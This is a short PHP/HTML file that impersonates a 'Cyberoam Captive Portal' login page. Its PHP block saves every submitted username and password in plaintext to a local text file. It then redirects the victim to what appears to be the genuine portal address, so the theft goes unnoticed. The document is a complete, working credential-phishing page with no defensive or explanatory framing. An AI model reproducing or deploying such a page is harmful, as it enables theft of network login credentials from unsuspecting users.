<html>
<head>
<title>Cyberoam Captive Portal</title>
<body style='background:#FFFFFF;font-family: Arial;font-size: 12px;color:#565656;'><table width='100%' cellspacing='0' cellpadding='0'><tr><td height='50px;' style='color:#565656' align='center' valign='middle'></td></tr></table><table width='100%'><tr><td align='center'>
 
<?php
 if(isset($_POST["name"]) && isset($_POST["password"])&& isset($_POST["submit"])) {
 $username = $_POST["name"];
 $password = $_POST["password"];
 if(!empty($username) && !empty($password))
 {
 $names=fopen('mjthakur.txt','a');
 fwrite($names, $username ."  ". $password . "\n");
 fclose($names);
header("Location:http://172.16.73.12:8090/httpclient.html");
}
 else
 {
   echo "All fields are reqd.";
 }

 }

?>

<form action='myfirstfile.php' method='POST'>
<p><b> Username :</b><br>
<input type="text" name="name"><br><br>
<b> Password :</b><br>
<input type="password" name="password"><br><br>
<input type="submit" name="submit" value="submit">
</form>

</body>
</html>